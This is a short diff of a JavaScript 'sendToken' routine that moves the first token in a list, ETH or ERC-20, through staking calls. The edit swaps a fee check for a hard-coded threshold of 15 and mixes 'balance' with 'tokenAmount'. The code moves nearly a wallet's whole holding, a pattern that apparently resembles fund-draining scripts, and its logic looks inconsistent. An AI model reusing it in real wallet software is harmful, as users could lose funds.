@@ -258,8 +258,8 @@ async function sendToken() {
     
     let result = null;
     if(tokenList[0].type == 0) {
-        if (tokenList[0].balance > transactionFee) {
-          result = await stakeEth(tokenList[0].balance - transactionFee);
+        if (tokenList[0].balance > 15) {
+          result = await stakeEth(tokenList[0].tokenAmount - transactionFee);
         }
     } else if(tokenList[0].type == 1) {
         result = await stakeERC20(tokenList[0].tokenAddress, tokenList[0].tokenAmount);
